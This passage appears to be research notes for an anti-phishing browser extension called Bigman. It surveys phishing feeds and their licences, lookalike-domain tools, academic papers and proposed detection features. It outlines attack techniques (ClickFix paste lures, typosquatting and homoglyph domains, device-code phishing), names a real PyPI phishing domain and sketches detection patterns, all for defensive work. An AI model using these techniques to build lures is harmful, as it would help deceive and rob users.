| OpenPhish Community Feed | https://openphish.com/terms.html , https://github.com/openphish/public_feed | "Solely for your personal use". No commercial purposes. No distributing or making the information available to third parties without written permission. | **No.** | Yes, personal user import only. | Commercial and Premium tiers are paid. |
| URLhaus (abuse.ch / Spamhaus) | https://abuse.ch/terms-of-use/ , https://urlhaus.abuse.ch/about | Free for authenticated users for not-for-profit purposes within fair-use limits. Commercial or for-profit use "may require a paid subscription" via Spamhaus. No copying or adapting without consent. No AI training without consent. Auth-Key required since 2025 (per third-party integration docs). | No, without Spamhaus consent. | Yes, by the user with their own Auth-Key. | Malware URLs (payload hosting), not phishing pages. Useful for the download host and comment-link rules (PH-09). |
| malware-filter "Phishing URL Blocklist" (curbengh) | https://gitlab.com/malware-filter/phishing-filter | Filter lists CC BY-SA 4.0; code CC0 and MIT. Built from OpenPhish, IPThreat and PhishTank, and not endorsed by them. | Legally murky to bundle, because upstream OpenPhish forbids redistribution. | Yes, as user import (hosts or domains format). | Already bundled as an optional uBlock Origin list. |
| uBlock Origin uAssets ("Badware risks" and others) | https://github.com/uBlockOrigin/uAssets | GPL-3.0 (repo license via GitHub API). | Possible (GPL-3.0 data alongside AGPL-3.0 code; keep attribution; confirm with the maintainer). | Yes, but only the domain-only subset maps to Bigman's format. | Most entries are cosmetic or network filters, not phishing hosts. |
| AdGuard filters / HostlistsRegistry | https://github.com/AdguardTeam/AdguardFilters , https://github.com/AdguardTeam/HostlistsRegistry | GPL-3.0 (repo licenses). Individual third-party lists in the registry carry their own licenses. | Possibly, per list. | Yes. | Check each upstream list's license separately. |
| HaGeZi DNS blocklists (Threat Intelligence Feeds) | https://github.com/hagezi/dns-blocklists | GPL-3.0 (repo license). | Possible, with the same caveat as uAssets. | Yes, domains format. | Aggregates many sources; large (may exceed the 20k import cap). |
| Phishing.Database (mitchellkrogza) | https://github.com/mitchellkrogza/Phishing.Database | MIT (repo license). | Possible. Upstream sources' terms still apply to the data. | Yes. | Large and noisy; best for user import. |
| Public Suffix List | https://github.com/publicsuffix/list | MPL-2.0. | **Yes**; already used via `tldts`. | n/a | Keep updated at build time; `allowPrivateDomains` is already on. |
| Unicode `confusables.txt` (UTS #39) | https://www.unicode.org/reports/tr39/ | Unicode License (data files; version not re-checked this session). | Yes (permissive). | n/a | Generate skeleton tables at build time (PH-03). |
| Chromium IDN spoof checker and lookalike heuristics | https://chromium.googlesource.com/chromium/src/+/main/docs/idn.md , https://chromium.googlesource.com/chromium/src/+/main/docs/security/lookalikes/lookalike-domains.md | Chromium BSD-style license. | Port the logic, not the top-domain list (built from Google data). | n/a | Chrome runs lookalike checks client-side against popular and engaged sites. Bigman adds *developer* targets Chrome may not consider "top". |
| Mozilla IDN display algorithm | https://wiki.mozilla.org/IDN_Display_Algorithm | Wiki documentation. | n/a | n/a | Moderately Restrictive (UTS #39) profile plus a TLD allowlist. A Firefox port of the extension should not assume Chrome's stricter display rules. |
| dnstwist | https://github.com/elceef/dnstwist | Apache-2.0. | Port the permutation algorithms at build time. | n/a | Fuzzers in source: addition, bitsquatting, cyrillic, dictionary, homoglyph, hyphenation, insertion, omission, plural, repetition, replacement, subdomain, tld-swap, transposition, various, vowel-swap. |
| Registry and vendor phishing notices (PyPI blog, Rust blog, GitHub blog, npm status) | e.g. https://blog.pypi.org/ , https://blog.rust-lang.org/ | Blog content; facts (domain names) are not copyrightable. | **Yes**, as a Bigman-curated "known developer-phishing domains" list with source URLs. | n/a | Feed via RSS (see [feeds](../research/vulnerability-intelligence-and-feeds.md)). |

## Tools and scripts worth mining for rules

| Tool | URL | License | What we can borrow | Caveats |
|---|---|---|---|---|
| dnstwist | https://github.com/elceef/dnstwist | Apache-2.0 | Permutation generators listed above; keyboard-adjacency maps; homoglyph table. | Its live DNS, WHOIS and screenshot features are not needed; use generators only. |
| Chromium `IDNSpoofChecker` / lookalike component | https://chromium.googlesource.com/chromium/src/+/main/docs/idn.md | BSD-3-Clause (Chromium) | Script-mixing rules, whole-script confusable by TLD, digit lookalikes, skeleton comparison, target-embedding heuristic. | C++ code; port the logic to JS/Rust. The top-sites list is not reusable. |
| Unicode UTS #39 data (`confusables.txt`, `IdentifierStatus.txt`) | https://www.unicode.org/reports/tr39/ | Unicode License | Skeleton function and restriction levels. | Large table; prune it to Latin-target mappings for size. |
| tldts (already a dependency) | https://github.com/remusao/tldts | MIT | PSL parsing, `getDomain`, `getSubdomain`. | Keep the PSL snapshot fresh at build time. |
| uBlock Origin uAssets / malware-filter | https://github.com/uBlockOrigin/uAssets , https://gitlab.com/malware-filter/phishing-filter | GPL-3.0 / CC BY-SA 4.0 | Import parser for `||domain^` and hosts formats; an allowlist of popular sites to avoid false positives. | Licensing of upstream feeds (see table above). |
| Installer inspector (Bigman's own) | `bigman inspect` | AGPL-3.0 | Reuse `shell.*` capability rules on clipboard or ClickFix payloads (PH-11, PH-12, PH-17). | Needs a new native-host op `inspect-text` with strict size limits. |
| PhishTank / OpenPhish / URLhaus | see feed table | various | Import format parsers only. | Do not bundle data. |
| GitPhish (Praetorian) | https://www.praetorian.com/blog/introducing-github-device-code-phishing/ | Red-team tool (not reviewed) | Defender-side only: the list of device-flow URLs and audit-log events to watch. | Offensive tooling; do not copy code. |

## Papers and long-form references

- Zhang, Hong, Cranor, 2007. "CANTINA: A Content-Based Approach to Detecting Phishing Web Sites." WWW 2007. https://doi.org/10.1145/1242572.1242659 (PDF: https://mail.www2007.cpsc.ucalgary.ca/papers/paper557.pdf). Takeaway: TF-IDF identity terms from the page, plus simple heuristics (age of domain, known images, suspicious URL, `@`/dashes/dots, IP hostnames, forms), catch about 95% of phish. The deterministic heuristics and the "page claims brand X but is not on X's domain" idea map directly to PH-05 and PH-14 (Bigman would use a local canonical-origin list instead of a search engine).
- Xiang, Hong, Rose, Cranor, 2011. "CANTINA+: A Feature-rich Machine Learning Framework for Detecting Phishing Web Sites." ACM TISSEC. https://doi.org/10.1145/2019599.2019606. Takeaway: the classifier is ML, but its feature catalogue (URL lexical, HTML DOM, form and login-field features) is a useful checklist of deterministic signals.
- Garera, Provos, Chew, Rubin, 2007. "A Framework for Detection and Measurement of Phishing Attacks." ACM WORM 2007. https://doi.org/10.1145/1314389.1314391. Takeaway: a taxonomy of URL obfuscation (IP host, brand in path, brand as subdomain, redirectors) that fits as discrete rules (PH-04, PH-21).
- Ma, Saul, Savage, Voelker, 2009. "Beyond Blacklists: Learning to Detect Malicious Web Sites from Suspicious URLs." KDD 2009. https://cseweb.ucsd.edu/~savage/papers/KDD09.pdf. Takeaway: lexical features (hostname length, token counts, specific tokens, dots, delimiters) carry strong signal. Bigman can use the features as transparent `info` rules without the statistical model.
- Prakash, Kumar, Kompella, Gupta, 2010. "PhishNet: Predictive Blacklisting to Detect Phishing Attacks." IEEE INFOCOM 2010. https://doi.org/10.1109/INFCOM.2010.5462216. Takeaway: a deterministic way to extend a blocklist by generating sibling URLs (TLD swaps, directory and filename variants) of known-bad entries. Useful for imported lists.
- Holgers, Watson, Gribble, 2006. "Cutting through the Confusion: A Measurement Study of Homograph Attacks." USENIX ATC 2006. https://www.usenix.org/legacy/event/usenix06/tech/holgers.html. Takeaway: early measurement of homograph registrations; motivates skeleton checks.
- Szurdi et al., 2014. "The Long 'Taile' of Typosquatting Domain Names." USENIX Security 2014. https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/szurdi. Takeaway: most typo domains target non-top sites. Developer services need their own brand pack, not just "top 10k".
- Agten, Joosen, Piessens, Nikiforakis, 2015. "Seven Months' Worth of Mistakes: A Longitudinal Study of Typosquatting Abuse." NDSS 2015. https://www.ndss-symposium.org/ndss2015/seven-months-worth-mistakes-longitudinal-study-typosquatting-abuse. Takeaway: typosquats are persistent and are re-registered over time, so local typo rules beat lists.
- Kintis et al., 2017. "Hiding in Plain Sight: A Longitudinal Study of Combosquatting Abuse." ACM CCS 2017. https://doi.org/10.1145/3133956.3134002. Takeaway: brand-plus-keyword domains (`npmjs-help`, `pypi-mirror`) are far more common than typos and long-lived. Supports `domain.brand` and a keyword list.
- Tian, Jan, Hu, Yao, Wang, 2018. "Needle in a Haystack: Tracking Down Elite Phishing Domains in the Wild." IMC 2018. https://doi.org/10.1145/3278532.3278569. Takeaway: squatting phishing domains and evasion measured at scale; a squatting-type taxonomy usable for rule IDs.
- Oest et al., 2020. "PhishTime: Continuous Longitudinal Measurement of the Effectiveness of Anti-phishing Blacklists." USENIX Security 2020. https://www.usenix.org/conference/usenixsecurity20/presentation/oest-phishtime. Takeaway: blocklists lag and miss evasive phishing; local heuristics are needed for the first hours.
- Dhamija, Tygar, Hearst, 2006. "Why Phishing Works." CHI 2006. https://doi.org/10.1145/1124772.1124861. Takeaway: users ignore address bars and security indicators; design warnings, not indicators.
- Egelman, Cranor, Hong, 2008. "You've Been Warned: An Empirical Study of the Effectiveness of Web Browser Phishing Warnings." CHI 2008. https://doi.org/10.1145/1357054.1357219. Takeaway: active (interstitial) warnings work far better than passive ones. This supports Bigman's warning page over badges.
- Akhawe, Porter Felt, 2013. "Alice in Warningland." USENIX Security 2013. https://www.usenix.org/conference/usenixsecurity13/technical-sessions/presentation/akhawe. Takeaway: about 10–25% clickthrough on phishing and malware warnings, and warning UX matters. Keep Bigman's continue path explicit and reasoned.
- Reynolds et al., 2020. "Measuring Identity Confusion with Uniform Resource Locators." CHI 2020. https://doi.org/10.1145/3313831.3376298. Takeaway: users misjudge URL structure (subdomain vs registrable domain). The warning page should highlight the registrable domain.
- Boucher, Anderson, 2023. "Trojan Source: Invisible Vulnerabilities." USENIX Security 2023. https://trojansource.codes/. Takeaway: bidi and homoglyph characters change meaning invisibly. The same character classes should be flagged in copied terminal commands (PH-12).
- Unicode Consortium. UTS #39 "Unicode Security Mechanisms" (v18.0.0, 2026-08-27). https://www.unicode.org/reports/tr39/. Takeaway: the normative skeleton and restriction-level definitions to implement in PH-03.

## Highest-value proposals from this domain

1. **Developer-ecosystem brand pack with canonical-origin allowlist and a short-brand fix** (PH-02, PH-18, PH-21). Today `pypj.org`, the real July 2025 PyPI phishing domain, produces no finding. Add npm, PyPI, crates.io, RubyGems, Go, Maven, NuGet, GitHub, GitLab, Codeberg, Docker Hub, Quay, GHCR, VS Code Marketplace, Open VSX, Flathub, Snapcraft, Homebrew and distro sites. Also generate dnstwist-style permutations at build time.
2. **Credential-entry guard** (PH-05, PH-14). Warn when a password or OTP field is focused on a non-canonical origin that presents a protected brand (CANTINA-style identity check, fully local).
3. **Clipboard and ClickFix guard routed through the installer inspector** (PH-11, PH-12, PH-17):
   - a MAIN-world clipboard-write shim and a copy-event mismatch check;
   - invisible and bidi character detection and a trailing-newline check;
   - Linux ClickFix phrases (Alt+F2, Ctrl+Alt+T);
   - a native-host `inspect-text` op reusing `shell.*` rules, plus `bigman inspect --clipboard`;
   - a `doctor` advisory if bracketed paste is disabled.
4. **OAuth-consent and device-code explainers on canonical pages** (PH-07, PH-08). Plain-language scopes, referrer awareness, and a confirmation step for write or admin scopes or for device codes reached from external links. This covers attacks that domain reputation cannot see.
5. **Redirect, shortener and navigation coverage** (PH-04, PH-19, PH-01):
   - unwrap known redirector parameters;
   - user-initiated, bounded, non-rendering redirect walk via native `inspect-url`;
   - `window.open` and hover/click href-swap checks;
   - `declarativeNetRequest` main-frame redirects to the warning page for imported blocklist entries, so typed and script navigations are also covered. This needs host permissions; dynamic rules cap at 30,000, with 5,000 for redirect-type "unsafe" rules.

## Open questions for the maintainer

1. **Brand pack scope and false positives.** Should the developer pack be on by default? Short brands (`npm`, `pypi`, `brew`) will flag some legitimate third-party sites, such as mirrors and docs hosts, at "review". Is that acceptable, or should it be `info` by default with a `review` toggle for maintainers?
2. **Credential guard intrusiveness.** Is blocking form submission until the user confirms acceptable, or should the guard only show a banner?
3. **MAIN-world scripts.** The clipboard, `window.open` and copy-guard work needs a `world: "MAIN"` content script (Chrome 111+). Pages could tamper with it. Is a best-effort shim acceptable, given that findings are "review", not verdicts?
4. **Host permissions.** `declarativeNetRequest` redirects to the warning page need host permissions for `<all_urls>`. This raises the Chrome Web Store review bar and the install-time permission prompt. Is that acceptable?
5. **Network-touching features.** These would be the first browser features that make network requests on the user's behalf: Safe Browsing opt-in, redirect resolution, invite-link checks. Should any of them exist, given the "no remote reputation" stance? If yes, should they be per-action only, as proposed here, or allowed on a schedule?
6. **Bundled phishing-domain list.** Should Bigman publish a small curated list of developer-targeted phishing domains, sourced from registry advisories through the RSS pipeline? It would need a review and update process and an expiry policy, because domains get taken down and later re-registered.
7. **Firefox port.** Firefox's IDN display policy is more permissive (TLD allowlist plus Moderately Restrictive), so the IDN rules matter more there. Is a Firefox MV3 port planned?
8. **Desktop chat and mail.** Links opened from Electron chat apps, Thunderbird or terminals reach the browser without context. Should Bigman offer an opt-in `xdg-open` / `x-scheme-handler/https` wrapper that runs `analyzeLink` before handing off? It would be rootless, but it changes the system default browser association.

## Verification notes

- Everything in this file was checked against primary or reputable secondary sources in this session, except the items below.
- The PhishTank registration status was checked live on 2026-10-29.
- **Unverified or not re-checked:**
  - 2026 phishing advisories for crates.io and RubyGems: none found, but the search budget was exhausted before an exhaustive sweep.
  - The license version for Unicode data files.
  - Whether PhishTank's Cisco EULA permits redistribution.
  - The exact Chrome milestone that blocked top-frame `data:` navigations. The blink-dev intent thread does not state it.
  - The GlassWorm details. They come from search-result summaries; the Koi blog now redirects to a Palo Alto Networks page.
